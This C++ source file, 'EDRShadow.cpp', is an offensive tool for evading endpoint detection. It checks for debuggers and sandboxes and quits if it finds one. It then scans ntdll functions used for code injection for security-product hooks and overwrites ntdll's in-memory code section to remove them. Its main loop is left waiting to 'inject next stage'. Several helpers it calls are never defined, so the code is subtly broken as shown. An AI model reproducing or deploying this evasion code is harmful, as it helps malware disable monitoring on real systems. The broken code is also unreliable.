// EDRShadow.cpp - Kernel/Userland EDR Hook Detector & Syscall Unhooker
// EPO - Lab / Explicit Permission ONLY! 💀

#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <vector>
#include <string>
#include <iomanip>
#include <chrono>
#include <random>
#include <fstream>

#pragma comment(lib, "ntdll.lib")

// ================= CONFIG =================
#define MAX_HOOK_SCAN_DEPTH 32
#define SLEEP_JITTER 0.4

// ================= ANTI-ANALYSIS =================
bool IsDebuggerPresentAdvanced() {
    BOOL isDbg = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDbg);
    return isDbg || IsDebuggerPresent();
}

bool IsSandbox() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors <= 2) return true; // low CPU count = sandbox
    return false;
}

// ================= SYSCALL UNHOOKING =================
PVOID GetModuleBase(const wchar_t* moduleName) {
    HMODULE hMod = GetModuleHandleW(moduleName);
    if (!hMod) {
        hMod = LoadLibraryW(moduleName);
    }
    return hMod;
}

bool RestoreNtdllSection() {
    HMODULE hNtdllDisk = LoadLibraryExW(L"ntdll.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtdllDisk) return false;

    HMODULE hNtdllMem = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdllMem) {
        FreeLibrary(hNtdllDisk);
        return false;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdllDisk;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)hNtdllDisk + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeader);

    for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)section[i].Name, ".text") == 0) {
            DWORD oldProtect;
            VirtualProtect((LPVOID)((BYTE*)hNtdllMem + section[i].VirtualAddress),
                           section[i].Misc.VirtualSize,
                           PAGE_EXECUTE_READWRITE,
                           &oldProtect);

            memcpy((BYTE*)hNtdllMem + section[i].VirtualAddress,
                   (BYTE*)hNtdllDisk + section[i].VirtualAddress,
                   section[i].Misc.VirtualSize);

            VirtualProtect((LPVOID)((BYTE*)hNtdllMem + section[i].VirtualAddress),
                           section[i].Misc.VirtualSize,
                           oldProtect,
                           &oldProtect);

            FreeLibrary(hNtdllDisk);
            return true;
        }
    }

    FreeLibrary(hNtdllDisk);
    return false;
}

// ================= HOOK DETECTION =================
bool IsFunctionHooked(PVOID funcAddr) {
    BYTE* p = (BYTE*)funcAddr;
    if (p[0] == 0xE9 || p[0] == 0xE8) return true; // jump/call hook
    if (*(WORD*)p == 0x25FF) return true; // jmp [addr]
    return false;
}

void ScanNtdllHooks() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return;

    std::vector<std::string> ntFunctions = {
        "NtCreateFile",
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtCreateThreadEx",
        "NtQueueApcThread",
        "NtDelayExecution"
    };

    std::cout << "[" << timestamp() << "] Scanning NTDLL hooks...\n";

    for (const auto& func : ntFunctions) {
        FARPROC addr = GetProcAddress(hNtdll, func.c_str());
        if (addr) {
            if (IsFunctionHooked(addr)) {
                std::cout << "  [!] Hooked: " << func << " at " << addr << "\n";
            } else {
                std::cout << "  [+] Clean: " << func << "\n";
            }
        }
    }
}

// ================= MAIN =================
int main() {
    if (IsDebuggerPresentAdvanced() || IsSandbox()) {
        ExitProcess(0);
    }

    std::cout << "[" << timestamp() << "] EDRShadow starting...\n";

    ScanNtdllHooks();

    std::cout << "[" << timestamp() << "] Attempting NTDLL unhooking...\n";
    if (RestoreNtdllSection()) {
        std::cout << "[" << timestamp() << "] NTDLL .text section restored (clean syscalls)\n";
    } else {
        std::cout << "[" << timestamp() << "] Unhook failed\n";
    }

    // Keep alive or inject next stage
    while (true) {
        SleepObfuscated(random() % (SLEEP_MAX - SLEEP_MIN) + SLEEP_MIN);
    }

    return 0;
}